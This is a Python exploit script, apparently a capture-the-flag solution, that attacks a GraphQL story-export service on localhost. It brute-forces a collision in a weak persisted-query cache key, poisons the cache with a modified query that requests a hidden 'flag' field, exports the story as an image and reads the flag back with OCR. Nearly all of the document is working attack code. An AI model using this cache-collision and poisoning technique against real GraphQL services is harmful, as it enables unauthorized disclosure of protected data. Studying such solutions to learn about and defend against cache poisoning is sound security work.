#!/usr/bin/env python3 
import requests
import uuid 
import sys 
import json
import time
import logging 
import argparse
import hashlib 
import easyocr

URL = "http://localhost:8080/api"

# API 
class ChallAPI:
  def __init__(self, url: str, tenant_id: str): 
    self.tenant_id = tenant_id
    self.sess = requests.Session()
    self.sess.cookies.set("tenantID", tenant_id)
    self.url = url 

  def graphql_query(self, query: str, variables: dict = {}):
    return self.sess.post(f"{self.url}/graphql", json={"query": query, "variables": variables})
  
  def create_story(self, text: str, action: str, image: int):
    return self.graphql_query("""
      mutation CreateStory($input:StoryInput!) { 
        createStory(story:$input) {
          id
        } 
      }
      """, {
      "input":{
        "text":text,
        "action":action,
        "image":image
      }
    })
  
  def graphql_query_with_persist(self, query: str, variables: dict = {}): 
    digest = hashlib.sha256(query.encode()).hexdigest()
    def make_key_smaller(key: str): 
      return sum(ord(c) for c in key) % 255

    logging.debug(f"query {query} has hash {digest} -> small key {make_key_smaller(digest)}")
    return self.sess.post(f"{self.url}/graphql", json={
      "query": query,
      "variables": variables,
      "extensions": {
        "persistedQuery": {
          "version": 1,
          "sha256Hash": digest
        }
      }
    })
  
  def create_export(self, story_id: str):
    return self.graphql_query("""
      mutation CreateExport($export: StoryExportInput!) { 
        createStoryExport(export: $export) {
          id
        }
      }
    """, {
      "export": {
        "storyId": story_id,
        "dimensions":"IPHONE_14_MAX"
      }
    })
  
  def get_export_ready(self, export_id: int):
    return self.graphql_query("""
      query GetExportReady($id: Int!) { 
        export(id: $id) { 
          ready
        }
      }
    """, {"id": export_id})
  
  def get_export_image(self, export_id: str):
    return self.sess.get(f"{self.url}/export/{export_id}")

  def upload(self, filename, fd, mimetype):
    files = [
      ("operations", json.dumps({
        "operationName": "UploadImage",
        "variables": {
          "file": None,
        },
        "query":"mutation UploadImage($file: Upload!) {\n  uploadImage(file: $file)\n}"
        })),
      ("map", json.dumps({"1": ["variables.file"]})),
      ("1", (filename, fd, mimetype)),
    ]
    return self.sess.post(f"{self.url}/graphql", files=files)

if __name__ == "__main__":
  # Logging
  logging.basicConfig(level=logging.DEBUG)

  # Args 
  ap = argparse.ArgumentParser()
  ap.add_argument("tenant_id", nargs="?", default=str(uuid.uuid4()))
  ap.add_argument("filename", nargs="?", default="image.png")
  args = ap.parse_args()

  tenant_id = args.tenant_id 
  filename = args.filename

  # Find a collision  
  def make_key_smaller(key: str): 
    return sum(ord(c) for c in key) % 5000
  def find_small_key(tenant_id: str, query: str): 
    sha_digest = tenant_id + hashlib.sha256(query.encode()).hexdigest()
    return make_key_smaller(sha_digest)

  old_query = """query ViewStoryPage($id: Int!) {
                    story(id: $id) {
                      id
                      text
                      action
                      image {
                        url
                      }
                    }
                  }"""
  old_key = find_small_key(tenant_id, old_query)

  new_query = 'query ViewStoryPage($id: Int!) {\n flag story(id: $id) {\n    id\n    text\n    action\n    image {\n      url\n      __typename\n    }\n    __typename\n  }\n}'
  winner_query = None
  for n in range(5000):
    try_query = new_query + '#'*n
    new_key = find_small_key(tenant_id, try_query)
    if new_key == old_key:
      logging.debug(f"Found collision for {old_key} with {n} bytes: {json.dumps(try_query)}")
      winner_query = try_query
      break
  else:
    logging.error("No collision wtf")
    exit(1)
  assert winner_query is not None


  logging.debug(f"Using tenant ID {tenant_id}")
  api = ChallAPI(URL, tenant_id)

  #
  # Start
  #

  # Upload an image
  logging.info("Uploading image")
  with open(filename, "rb") as fd:
    res = api.upload(filename, fd, "image/png")
    # print(res.text)
    image_id = res.json()["data"]["uploadImage"]
    logging.debug("image uploaded with ID ", image_id)

  # Create a story with that image
  logging.info("Creating story")
  res = api.create_story("{{flag}}", "content", image_id)
  # print(res.text)
  story_id = res.json()["data"]["createStory"]["id"]

  # Pollute cache
  logging.info("Polluting query cache")
  api.graphql_query_with_persist(winner_query, {"id": story_id})

  # Create export of that story 
  logging.info("Creating export")
  res = api.create_export(story_id)
  logging.debug(res.text)
  export_id = res.json()["data"]["createStoryExport"]["id"]

  # Wait for export to be ready
  logging.info(f"Polling export {export_id} readiness")
  while True:
    res = api.get_export_ready(export_id)
    logging.debug(res.text)
    if res.json()["data"]["export"]["ready"]:
      break
    time.sleep(1)

  logging.info("Export is ready")
  logging.debug("Loading exported image")
  img = api.get_export_image(export_id)
  with open("export.png", "wb") as fd:
    fd.write(img.content)
    logging.info("Exported image saved to export.png")

  reader = easyocr.Reader(["en"])
  first, second, third = reader.readtext("export.png", allowlist="CTE24{}abcdefghiklmnopqrstuvwxyz_0123456789", detail=0)
  print("text is", first + second)
